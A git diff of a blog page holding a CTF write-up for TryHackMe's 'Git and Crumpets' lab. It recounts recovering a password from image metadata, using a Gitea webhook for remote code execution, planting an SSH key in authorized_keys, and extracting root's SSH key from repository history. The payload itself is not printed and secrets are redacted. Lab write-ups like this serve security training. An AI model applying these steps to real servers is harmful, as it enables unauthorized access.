@@ -1,376 +1,74 @@
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-    
-      <title>
-        Git and Crumpets - Write Up ::
-        Lanfran02 - Blog — A place to look for write-ups.
-      </title>
-    
-    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<meta
-  name="description"
-  content="Link Level Creator     Here Medium hydragyrum    Reconn In the description of this room we can find that &amp;ldquo;the developers included a few countermeasures&amp;hellip;&amp;rdquo;
+<!doctype html><html lang=en><head><title>Git and Crumpets - Write Up ::
+Lanfran02 - Blog — Where write-ups are made.</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Link Level Creator     Here Medium hydragyrum    Reconn In the description of this room we can find that &amp;ldquo;the developers included a few countermeasures&amp;hellip;&amp;rdquo;
 It&amp;rsquo;s very hard to use nmap because the server starts blocking our requests. We practically can not scan the machine, we just have the IP and using the browser we get redirected to a youtube video.
-But we can use curl to get the source code of the page."
-/>
-<meta
-  name="keywords"
-  content="CTF, Writeup, Hacking"
-/>
-<meta name="robots" content="noodp" />
-<link rel="canonical" href="/posts/gitandcrumpets/" />
-
-
-
-
-
-<link rel="stylesheet" href="/assets/style.css" />
-
-<link rel="stylesheet" href="/style.css" />
-
-
-<link
-  rel="apple-touch-icon-precomposed"
-  sizes="144x144"
-  href="/img/apple-touch-icon-144-precomposed.png"
-/>
-<link rel="shortcut icon" href="/img/favicon.png" />
-
-
-<link href="/assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
-<link href="/assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
-<link href="/assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
-<link href="/assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
-<link href="/assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
-<link href="/assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
-
-
-<meta name="twitter:card" content="summary_large_image"/>
-<meta name="twitter:image" content="/posts/gitandcrumpets/cover.png"/>
-<meta name="twitter:title" content="Git and Crumpets - Write Up"/>
-<meta name="twitter:description" content="TryHackMe&#39;s medium level machine."/>
-
-
-
-<meta property="og:title" content="Git and Crumpets - Write Up" />
-<meta property="og:description" content="TryHackMe&#39;s medium level machine." />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="/posts/gitandcrumpets/" />
-<meta property="og:image" content="/posts/gitandcrumpets/cover.png"/>
-<meta property="og:site_name" content="Lanfran02 - Blog" />
-
-
-
-
-
-
-  </head>
-  <body class="dark-theme">
-    <div class="container">
-      <header class="header">
-  <span class="header__inner">
-    <a
-  href="/"
-  class="logo"
-  style="text-decoration: none;"
->
-  
-    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
-  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
-</svg>
-</span>
-    <span class="logo__text"
-      >Lanfran02</span
-    >
-    <span class="logo__cursor"></span>
-  
-</a>
-
-    <span class="header__right">
-      
-        <nav class="menu">
-  <ul class="menu__inner menu__inner--desktop">
-    
-      
-        
-          <li><a href="/about">About</a></li>
-        
-      
-        
-          <li><a href="/write-ups">Write Ups</a></li>
-        
-      
-      
-      
-  </ul>
-
-  <ul class="menu__inner menu__inner--mobile">
-    
-      
-        <li><a href="/about">About</a></li>
-      
-    
-      
-        <li><a href="/write-ups">Write Ups</a></li>
-      
-    
-  </ul>
-</nav>
-
-        <span class="menu-trigger">
-          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
-            <path d="M0 0h24v24H0z" fill="none" />
-            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
-          </svg>
-        </span>
-      
-      <span class="theme-toggle">
-        <svg
-  class="theme-toggler"
-  width="24"
-  height="24"
-  viewBox="0 0 48 48"
-  fill="none"
-  xmlns="http://www.w3.org/2000/svg"
->
-  <path
-    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
-  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
-  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
-  />
-</svg>
-
-      </span>
-    </span>
-  </span>
-</header>
-
-
-      <div class="content">
-        
-  
-  
-
-  <div class="post">
-    <h1 class="post-title">Git and Crumpets - Write Up</h1>
-    <div class="post-meta">
-      
-
-      
-        <span class="post-author"
-          >— Written by Lanfran02</span
-        >
-
-
-      
-        <span class="post-read-time"
-          >— 4 min read</span
-        >
-      
-    </div>
-
-    
-      <span class="post-tags">
-        
-          <a href="/tags/gittools/">#gittools</a>&nbsp;
-        
-          <a href="/tags/git/">#git</a>&nbsp;
-        
-          <a href="/tags/gitea/">#gitea</a>&nbsp;
-        
-          <a href="/tags/ssh/">#ssh</a>&nbsp;
-        
-          <a href="/tags/tryhackme/">#TryHackMe</a>&nbsp;
-        
-      </span>
-    
-
-    
-      <figure class="post-cover">
-        
-          <img src="/posts/gitandcrumpets/cover.png" alt="Git and Crumpets - Write Up" />
-        
-
-        
-      </figure>
-    
-
-    <div class="post-content">
-      
-        
-        <h2>Table of Contents</h2>
-        <aside class="table-of-contents"><nav id="TableOfContents">
-  <ul>
-    <li><a href="#reconn">Reconn</a></li>
-    <li><a href="#foothold---user">FootHold - User</a></li>
-    <li><a href="#root">Root</a></li>
-  </ul>
-</nav></aside>
-        
-      
-      <table>
-<thead>
-<tr>
-<th>Link</th>
-<th>Level</th>
-<th>Creator</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><a href="https://tryhackme.com/room/gitandcrumpets">Here</a></td>
-<td>Medium</td>
-<td><a href="https://tryhackme.com/p/hydragyrum">hydragyrum</a></td>
-</tr>
-</tbody>
-</table>
-<h2 id="reconn">Reconn</h2>
-<p>In the description of this room we can find that &ldquo;<em>the developers included a few countermeasures&hellip;</em>&rdquo;</p>
-<p>It&rsquo;s very hard to use nmap because the server starts blocking our requests.
-We practically can not scan the machine, we just have the IP and using the browser we get redirected to a youtube video.</p>
-<p>But we can use curl to get the source code of the page.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╰─ lanfran@parrot ❯ curl 10.10.197.95                                                                                              ─╯
-<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+But we can use curl to get the source code of the page."><meta name=keywords content="CTF,Writeup,Hacking"><meta name=robots content="noodp"><link rel=canonical href=/posts/gitandcrumpets/><link rel=stylesheet href=/assets/style.css><link rel=stylesheet href=/style.css><link rel=apple-touch-icon-precomposed sizes=144x144 href=/img/apple-touch-icon-144-precomposed.png><link rel="shortcut icon" href=/img/favicon.png><link href=/assets/fonts/Inter-Italic.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=/assets/fonts/Inter-Regular.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=/assets/fonts/Inter-Medium.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=/assets/fonts/Inter-MediumItalic.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=/assets/fonts/Inter-Bold.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=/assets/fonts/Inter-BoldItalic.woff2 rel=preload type=font/woff2 as=font crossorigin><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/posts/gitandcrumpets/cover.png"><meta name=twitter:title content="Git and Crumpets - Write Up"><meta name=twitter:description content="TryHackMe's medium level machine."><meta property="og:title" content="Git and Crumpets - Write Up"><meta property="og:description" content="TryHackMe's medium level machine."><meta property="og:type" content="article"><meta property="og:url" content="/posts/gitandcrumpets/"><meta property="og:image" content="/posts/gitandcrumpets/cover.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-07-03T00:00:00+00:00"><meta property="article:modified_time" content="2021-07-03T00:00:00+00:00"><meta property="og:site_name" content="Lanfran02 - Blog"><script async src="https://www.googletagmanager.com/gtag/js?id=G-3T7DYCWC0W"></script><script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-3T7DYCWC0W',{anonymize_ip:!1})}</script><script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga('create','G-3T7DYCWC0W','auto'),ga('send','pageview'))</script><script async src=https://www.google-analytics.com/analytics.js></script></head><body class=dark-theme><div class=container><header class=header><span class=header__inner><a href=/ class=logo style=text-decoration:none><span class=logo__mark><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg></span><span class=logo__text>Lanfran02</span>
+<span class=logo__cursor></span></a><span class=header__right><nav class=menu><ul class="menu__inner menu__inner--desktop"><li><a href=/about>About</a></li><li><a href=/tags/hackthebox/>HTB</a></li><li><a href=/tags/tryhackme/>THM</a></li></ul><ul class="menu__inner menu__inner--mobile"><li><a href=/about>About</a></li><li><a href=/tags/hackthebox/>HTB</a></li><li><a href=/tags/tryhackme/>THM</a></li></ul></nav><span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg></span><span class=theme-toggle><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg></span></span></span></header><div class=content><div class=post><h1 class=post-title>Git and Crumpets - Write Up</h1><div class=post-meta><span class=post-date>2021-07-03</span>
+<span class=post-author>— Written by Lanfran02</span>
+<span class=post-read-time>— 4 min read</span></div><span class=post-tags><a href=/tags/gittools/>#gittools</a>&nbsp;
+<a href=/tags/git/>#git</a>&nbsp;
+<a href=/tags/gitea/>#gitea</a>&nbsp;
+<a href=/tags/ssh/>#ssh</a>&nbsp;
+<a href=/tags/tryhackme/>#TryHackMe</a>&nbsp;</span><figure class=post-cover><img src=/posts/gitandcrumpets/cover.png alt="Git and Crumpets - Write Up"></figure><div class=post-content><h2>Table of Contents</h2><aside class=table-of-contents><nav id=TableOfContents><ul><li><a href=#reconn>Reconn</a></li><li><a href=#foothold---user>FootHold - User</a></li><li><a href=#root>Root</a></li></ul></nav></aside><table><thead><tr><th>Link</th><th>Level</th><th>Creator</th></tr></thead><tbody><tr><td><a href=https://tryhackme.com/room/gitandcrumpets>Here</a></td><td>Medium</td><td><a href=https://tryhackme.com/p/hydragyrum>hydragyrum</a></td></tr></tbody></table><h2 id=reconn>Reconn</h2><p>In the description of this room we can find that &ldquo;<em>the developers included a few countermeasures&mldr;</em>&rdquo;</p><p>It&rsquo;s very hard to use nmap because the server starts blocking our requests.
+We practically can not scan the machine, we just have the IP and using the browser we get redirected to a youtube video.</p><p>But we can use curl to get the source code of the page.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ curl 10.10.197.95                                                                                              ─╯
+<span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
       &lt;h1&gt;Nothing to see here, move along&lt;/h1&gt;
       &lt;h2&gt;Notice:&lt;/h2&gt;
       &lt;p&gt; 
         Hey guys,
-           I set up the dev repos at <span style="color:#f92672">[</span>REDACTED<span style="color:#f92672">]</span>.git-and-crumpets.thm, but I haven<span style="color:#e6db74">&#39;t gotten around to setting up the DNS yet. 
-</span><span style="color:#e6db74">           In the meantime, here&#39;</span>s a fun video I found!
+           I set up the dev repos at <span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>.git-and-crumpets.thm, but I haven<span style=color:#e6db74>&#39;t gotten around to setting up the DNS yet. 
+</span><span style=color:#e6db74>           In the meantime, here&#39;</span>s a fun video I found!
         Hydra
       &lt;/p&gt;
       &lt;pre&gt;
-<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
-</code></pre></div><p>Let&rsquo;s add the new subdomain found to our /etc/hosts file, and browse to it.</p>
-<p>It&rsquo;s a Gitea page.</p>
-<h2 id="foothold---user">FootHold - User</h2>
-<p>I digged into the page, and didn&rsquo;t find anything. So I registered a new account.</p>
-<p>Browsing through the repos, I found 2 users, <em><strong>scones</strong></em> and <em><strong>hydra</strong></em> with some own repositories.</p>
-<p>The user scones, had a repository where he commited some changes.</p>
-<p>Reading the comments of the commit <em>&ldquo;I kept the password in my avatar to be more secure.&quot;</em> we know where this user stores his password.</p>
-<p>So I downloaded the file, and used exiftool to see if it has something interesting.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╰─ lanfran@parrot ❯ exiftool cant-touch-this/photo.jpg                                                                            
-<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+<span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
+</code></pre></div><p>Let&rsquo;s add the new subdomain found to our /etc/hosts file, and browse to it.</p><p>It&rsquo;s a Gitea page.</p><h2 id=foothold---user>FootHold - User</h2><p>I digged into the page, and didn&rsquo;t find anything. So I registered a new account.</p><p>Browsing through the repos, I found 2 users, <em><strong>scones</strong></em> and <em><strong>hydra</strong></em> with some own repositories.</p><p>The user scones, had a repository where he commited some changes.</p><p>Reading the comments of the commit <em>&ldquo;I kept the password in my avatar to be more secure."</em> we know where this user stores his password.</p><p>So I downloaded the file, and used exiftool to see if it has something interesting.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ exiftool cant-touch-this/photo.jpg                                                                            
+<span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
 Interlace                       : Noninterlaced
-Description                     : My <span style="color:#f92672">[</span>REDACTED<span style="color:#f92672">]</span> guess
-<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
-</code></pre></div><p>Cool!</p>
-<p>We now can login to the page with the user scones and his password!</p>
-<p>Looking online, Gitea has an exploit where you can use webhooks for RCE.</p>
-<p>So let&rsquo;s use the repo cant-touch-this to exploit it!</p>
-<p>Unluckily we can&rsquo;t get a rev shell straight forward. But we can put our ssh key in the authorized_keys of the user &ldquo;git&rdquo;. Even we can read the user&rsquo;s flag from here.</p>
-<p><img src="user.png" alt="User"></p>
-<p>Adding that part, we need to clone the repo to our local machine,and make a new commit.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git clone http://<span style="color:#f92672">[</span>REDACTED<span style="color:#f92672">]</span>.git-and-crumpets.thm/scones/cant-touch-this.git
-<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+Description                     : My <span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span> guess
+<span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
+</code></pre></div><p>Cool!</p><p>We now can login to the page with the user scones and his password!</p><p>Looking online, Gitea has an exploit where you can use webhooks for RCE.</p><p>So let&rsquo;s use the repo cant-touch-this to exploit it!</p><p>Unluckily we can&rsquo;t get a rev shell straight forward. But we can put our ssh key in the authorized_keys of the user &ldquo;git&rdquo;. Even we can read the user&rsquo;s flag from here.</p><p><img src=user.png alt=User></p><p>Adding that part, we need to clone the repo to our local machine,and make a new commit.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>git clone http://<span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>.git-and-crumpets.thm/scones/cant-touch-this.git
+<span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
 
-╰─ lanfran@parrot ❯ git add hello.php <span style="color:#f92672">&amp;&amp;</span> git commit -m <span style="color:#e6db74">&#34;Exploiting&#34;</span> <span style="color:#f92672">&amp;&amp;</span> git push -u origin master                                   ─╯
-<span style="color:#f92672">[</span>master 6233b49<span style="color:#f92672">]</span> Exploiting
+╰─ lanfran@parrot ❯ git add hello.php <span style=color:#f92672>&amp;&amp;</span> git commit -m <span style=color:#e6db74>&#34;Exploiting&#34;</span> <span style=color:#f92672>&amp;&amp;</span> git push -u origin master                                   ─╯
+<span style=color:#f92672>[</span>master 6233b49<span style=color:#f92672>]</span> Exploiting
 
-<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
- <span style="color:#ae81ff">1</span> file changed, <span style="color:#ae81ff">0</span> insertions<span style="color:#f92672">(</span>+<span style="color:#f92672">)</span>, <span style="color:#ae81ff">0</span> deletions<span style="color:#f92672">(</span>-<span style="color:#f92672">)</span>
- create mode <span style="color:#ae81ff">100644</span> hello.php
-Username <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;http://[REDACTED].git-and-crumpets.thm&#39;</span>: scones
-Password <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;http://scones@[REDACTED].git-and-crumpets.thm&#39;</span>: 
-Enumerating objects: 3, <span style="color:#66d9ef">done</span>.
-Counting objects: 100% <span style="color:#f92672">(</span>3/3<span style="color:#f92672">)</span>, <span style="color:#66d9ef">done</span>.
-Delta compression using up to <span style="color:#ae81ff">4</span> threads
-Compressing objects: 100% <span style="color:#f92672">(</span>2/2<span style="color:#f92672">)</span>, <span style="color:#66d9ef">done</span>.
-Writing objects: 100% <span style="color:#f92672">(</span>2/2<span style="color:#f92672">)</span>, <span style="color:#ae81ff">276</span> bytes | 276.00 KiB/s, <span style="color:#66d9ef">done</span>.
-Total <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>delta 0<span style="color:#f92672">)</span>, reused <span style="color:#ae81ff">0</span> <span style="color:#f92672">(</span>delta 0<span style="color:#f92672">)</span>, pack-reused <span style="color:#ae81ff">0</span>
-remote: . Processing <span style="color:#ae81ff">1</span> references
-remote: Processed <span style="color:#ae81ff">1</span> references in total
-remote: dGhte2ZkN2Fi<span style="color:#f92672">[</span>REDACTED<span style="color:#f92672">]</span>ZhYTE2fQ<span style="color:#f92672">==</span> &lt;--- ****USER FLAG****
-To http://<span style="color:#f92672">[</span>REDACTED<span style="color:#f92672">]</span>.git-and-crumpets.thm/scones/cant-touch-this.git
+<span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
+ <span style=color:#ae81ff>1</span> file changed, <span style=color:#ae81ff>0</span> insertions<span style=color:#f92672>(</span>+<span style=color:#f92672>)</span>, <span style=color:#ae81ff>0</span> deletions<span style=color:#f92672>(</span>-<span style=color:#f92672>)</span>
+ create mode <span style=color:#ae81ff>100644</span> hello.php
+Username <span style=color:#66d9ef>for</span> <span style=color:#e6db74>&#39;http://[REDACTED].git-and-crumpets.thm&#39;</span>: scones
+Password <span style=color:#66d9ef>for</span> <span style=color:#e6db74>&#39;http://scones@[REDACTED].git-and-crumpets.thm&#39;</span>: 
+Enumerating objects: 3, <span style=color:#66d9ef>done</span>.
+Counting objects: 100% <span style=color:#f92672>(</span>3/3<span style=color:#f92672>)</span>, <span style=color:#66d9ef>done</span>.
+Delta compression using up to <span style=color:#ae81ff>4</span> threads
+Compressing objects: 100% <span style=color:#f92672>(</span>2/2<span style=color:#f92672>)</span>, <span style=color:#66d9ef>done</span>.
+Writing objects: 100% <span style=color:#f92672>(</span>2/2<span style=color:#f92672>)</span>, <span style=color:#ae81ff>276</span> bytes | 276.00 KiB/s, <span style=color:#66d9ef>done</span>.
+Total <span style=color:#ae81ff>2</span> <span style=color:#f92672>(</span>delta 0<span style=color:#f92672>)</span>, reused <span style=color:#ae81ff>0</span> <span style=color:#f92672>(</span>delta 0<span style=color:#f92672>)</span>, pack-reused <span style=color:#ae81ff>0</span>
+remote: . Processing <span style=color:#ae81ff>1</span> references
+remote: Processed <span style=color:#ae81ff>1</span> references in total
+remote: dGhte2ZkN2Fi<span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>ZhYTE2fQ<span style=color:#f92672>==</span> &lt;--- ****USER FLAG****
+To http://<span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>.git-and-crumpets.thm/scones/cant-touch-this.git
    9ae06d7..6233b49  master -&gt; master
-Branch <span style="color:#e6db74">&#39;master&#39;</span> set up to track remote branch <span style="color:#e6db74">&#39;master&#39;</span> from <span style="color:#e6db74">&#39;origin&#39;</span>.
-</code></pre></div><p>If everithing it&rsquo;s okay, we can now ssh to the machine with <em>git</em>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">─ lanfran@parrot ❯ ssh git@git-and-crumpets.thm -i id_rsa                                                                     ─╯
-Warning: Permanently added the ECDSA host key <span style="color:#66d9ef">for</span> IP address <span style="color:#e6db74">&#39;10.10.69.176&#39;</span> to the list of known hosts.
-Last failed login: Fri May <span style="color:#ae81ff">21</span> 18:30:37 CEST <span style="color:#ae81ff">2021</span> from 192.168.247.1 on ssh:notty
-There was <span style="color:#ae81ff">1</span> failed login attempt since the last successful login.
-Last login: Sat Apr <span style="color:#ae81ff">17</span> 23:07:52 <span style="color:#ae81ff">2021</span>
-<span style="color:#f92672">[</span>git@git-and-crumpets ~<span style="color:#f92672">]</span>$ ls
+Branch <span style=color:#e6db74>&#39;master&#39;</span> set up to track remote branch <span style=color:#e6db74>&#39;master&#39;</span> from <span style=color:#e6db74>&#39;origin&#39;</span>.
+</code></pre></div><p>If everithing it&rsquo;s okay, we can now ssh to the machine with <em>git</em>.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>─ lanfran@parrot ❯ ssh git@git-and-crumpets.thm -i id_rsa                                                                     ─╯
+Warning: Permanently added the ECDSA host key <span style=color:#66d9ef>for</span> IP address <span style=color:#e6db74>&#39;10.10.69.176&#39;</span> to the list of known hosts.
+Last failed login: Fri May <span style=color:#ae81ff>21</span> 18:30:37 CEST <span style=color:#ae81ff>2021</span> from 192.168.247.1 on ssh:notty
+There was <span style=color:#ae81ff>1</span> failed login attempt since the last successful login.
+Last login: Sat Apr <span style=color:#ae81ff>17</span> 23:07:52 <span style=color:#ae81ff>2021</span>
+<span style=color:#f92672>[</span>git@git-and-crumpets ~<span style=color:#f92672>]</span>$ ls
 user.txt
-</code></pre></div><h2 id="root">Root</h2>
-<p>Looking inside the machine, I found an interesting folder from root&rsquo;s repository.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>git@git-and-crumpets ~<span style="color:#f92672">]</span>$ ls -la /var/lib/gitea/data/gitea-repositories/root
-total <span style="color:#ae81ff">0</span>
-drwxr-xr-x. <span style="color:#ae81ff">3</span> git git  <span style="color:#ae81ff">24</span> Apr <span style="color:#ae81ff">15</span> 15:25 .
-drwxr-xr-x. <span style="color:#ae81ff">5</span> git git  <span style="color:#ae81ff">45</span> Apr <span style="color:#ae81ff">15</span> 15:50 ..
-drwxr-xr-x. <span style="color:#ae81ff">7</span> git git <span style="color:#ae81ff">119</span> Apr <span style="color:#ae81ff">15</span> 15:25 backup.git
-</code></pre></div><p>I downloaded the entire folder and used GitTools&rsquo;s extractor to extract all the commits.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/THM/tools/GitTools/Extractor/extractor.sh ~/THM/gitandcrumpets/root/ .
-</code></pre></div><p>After that, used git log to check what the user did.</p>
-<p>Checked the hashes of the commits and made a diff of all of them.</p>
-<p>I found the ssh private key of root!!</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">─ lanfran@parrot ❯ git diff 0b23539d97978fc83b763ef8a4b3882d16e71d32 c242a466aa5d4ae0bb8206ef5d05351d3fd6aff9 &gt; dumped_data
-</code></pre></div><p>Inside dumped_data we have the ssh key and where the key was stored, among with the file&rsquo;s name.</p>
-<p>I tried to ssh with root to the machine, but it was protected. So I ran hydra against it&hellip;</p>
-<p>BUT, it was taking too much time, so I tried with the key&rsquo;s name itself &ldquo;Su[REDACTED]r3&rdquo;. How did I get this? iniside the dumped file :)</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╰─ lanfran@parrot ❯ ssh root@git-and-crumpets.thm -i id_rsa_root                                                                  ─╯
-Enter passphrase <span style="color:#66d9ef">for</span> key <span style="color:#e6db74">&#39;id_rsa_root&#39;</span>: 
-Last login: Fri Jul  <span style="color:#ae81ff">2</span> 23:11:30 <span style="color:#ae81ff">2021</span>
-<span style="color:#f92672">[</span>root@git-and-crumpets ~<span style="color:#f92672">]</span><span style="color:#75715e"># id</span>
-uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> context<span style="color:#f92672">=</span>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
-<span style="color:#f92672">[</span>root@git-and-crumpets ~<span style="color:#f92672">]</span><span style="color:#75715e"># ls </span>
+</code></pre></div><h2 id=root>Root</h2><p>Looking inside the machine, I found an interesting folder from root&rsquo;s repository.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#f92672>[</span>git@git-and-crumpets ~<span style=color:#f92672>]</span>$ ls -la /var/lib/gitea/data/gitea-repositories/root
+total <span style=color:#ae81ff>0</span>
+drwxr-xr-x. <span style=color:#ae81ff>3</span> git git  <span style=color:#ae81ff>24</span> Apr <span style=color:#ae81ff>15</span> 15:25 .
+drwxr-xr-x. <span style=color:#ae81ff>5</span> git git  <span style=color:#ae81ff>45</span> Apr <span style=color:#ae81ff>15</span> 15:50 ..
+drwxr-xr-x. <span style=color:#ae81ff>7</span> git git <span style=color:#ae81ff>119</span> Apr <span style=color:#ae81ff>15</span> 15:25 backup.git
+</code></pre></div><p>I downloaded the entire folder and used GitTools&rsquo;s extractor to extract all the commits.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>/THM/tools/GitTools/Extractor/extractor.sh ~/THM/gitandcrumpets/root/ .
+</code></pre></div><p>After that, used git log to check what the user did.</p><p>Checked the hashes of the commits and made a diff of all of them.</p><p>I found the ssh private key of root!!</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>─ lanfran@parrot ❯ git diff 0b23539d97978fc83b763ef8a4b3882d16e71d32 c242a466aa5d4ae0bb8206ef5d05351d3fd6aff9 &gt; dumped_data
+</code></pre></div><p>Inside dumped_data we have the ssh key and where the key was stored, along with the file&rsquo;s name.</p><p>I tried to ssh with root to the machine, but it was protected. So I ran hydra against it&mldr;</p><p>BUT, it was taking too much time, so I tried with the key&rsquo;s name itself &ldquo;Su[REDACTED]r3&rdquo;. How did I get this? iniside the dumped file :)</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ ssh root@git-and-crumpets.thm -i id_rsa_root                                                                  ─╯
+Enter passphrase <span style=color:#66d9ef>for</span> key <span style=color:#e6db74>&#39;id_rsa_root&#39;</span>: 
+Last login: Fri Jul  <span style=color:#ae81ff>2</span> 23:11:30 <span style=color:#ae81ff>2021</span>
+<span style=color:#f92672>[</span>root@git-and-crumpets ~<span style=color:#f92672>]</span><span style=color:#75715e># id</span>
+uid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> context<span style=color:#f92672>=</span>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+<span style=color:#f92672>[</span>root@git-and-crumpets ~<span style=color:#f92672>]</span><span style=color:#75715e># ls </span>
 anaconda-ks.cfg  root.txt
-</code></pre></div><p>And we rooted the machine!</p>
-<p>That&rsquo;s all from my side, hope you find this helpful!</p>
-
-    </div>
-    
-      
-        <div class="pagination">
-          <div class="pagination__title">
-            <span class="pagination__title-h"
-              >Read other posts</span
-            >
-            <hr />
-          </div>
-          <div class="pagination__buttons">
-            
-              <span class="button previous">
-                <a href="/posts/brooklynninenine/">
-                  <span class="button__icon">←</span>
-                  <span class="button__text">Brooklynninenine - Write Up</span>
-                </a>
-              </span>
-            
-            
